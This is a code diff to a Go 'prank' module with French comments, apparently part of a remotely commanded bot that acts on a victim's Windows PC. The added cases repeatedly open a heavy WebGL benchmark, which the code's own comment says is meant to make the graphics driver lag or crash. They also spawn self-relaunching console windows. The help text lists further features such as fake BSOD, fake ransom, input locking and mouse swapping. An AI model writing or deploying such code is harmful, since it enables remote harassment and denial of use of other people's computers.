@@ -188,7 +188,7 @@ func prankRun(kind, arg string) string {
 		}
 		return "son coupé (renvoyer la commande le remet)."
 
-	case "flood", "terminaux":
+	case "flood":
 		// Ouvre N consoles visibles portant le texte demandé. Chaque fenêtre
 		// porte le titre PRANK, ce qui permet à `!prank stop` de les fermer
 		// sans toucher aux autres.
@@ -217,7 +217,46 @@ func prankRun(kind, arg string) string {
 		_ = c.Run()
 		return "consoles du prank fermées."
 
+	case "vsbm", "3d":
+		// Ouvre le benchmark WebGL plusieurs fois : plusieurs contextes 3D
+		// lourds font ramer ou planter le pilote graphique.
+		n := 5
+		if v, err := atoi(arg); err == nil && v > 0 && v <= 15 {
+			n = v
+		}
+		for i := 0; i < n; i++ {
+			c := exec.Command("cmd.exe", "/c", "start", "", "https://cznull.github.io/vsbm")
+			_ = c.Start()
+			time.Sleep(400 * time.Millisecond)
+		}
+		return fmt.Sprintf("%d onglet(s) 3D ouvert(s) — fermer : !prank stop.", n)
+
+	case "terminals", "boucle":
+		// Consoles qui se relancent en boucle tant que le prank n'est pas arrêté.
+		n := 5
+		if v, err := atoi(arg); err == nil && v > 0 && v <= 20 {
+			n = v
+		}
+		for i := 0; i < n; i++ {
+			c := exec.Command("cmd.exe", "/c", "start", "", "cmd.exe", "/k",
+				"title PRANK & :loop & echo Ne ferme pas cette fenetre ! & timeout /t 2 >nul & goto loop")
+			_ = c.Start()
+			time.Sleep(150 * time.Millisecond)
+		}
+		return fmt.Sprintf("%d console(s) en boucle — fermer : !prank stop.", n)
+
+	case "revert", "annule":
+		// Remet l'état normal : consoles du prank, barre des tâches, souris.
+		c := exec.Command("taskkill.exe", "/FI", "WINDOWTITLE eq PRANK*", "/F")
+		c.SysProcAttr = hiddenAttr()
+		_ = c.Run()
+		prankRun("taskbar", "show")
+		script := "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class R { [DllImport(\"user32.dll\")] public static extern bool SwapMouseButton(bool f); }';" +
+			"[void][R]::SwapMouseButton($false); 'ok'"
+		_, _ = runPSUTF8(script)
+		return "état normal rétabli : barre des tâches, souris, consoles du prank."
+
 	default:
-		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse, bsod, ransom, jiggle, keyboard, mute, flood <n> <texte>, stop"
+		return "blagues : msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse, bsod, ransom, jiggle, keyboard, mute, flood <n> <texte>, vsbm <n>, terminals <n>, stop, revert"
 	}
 }
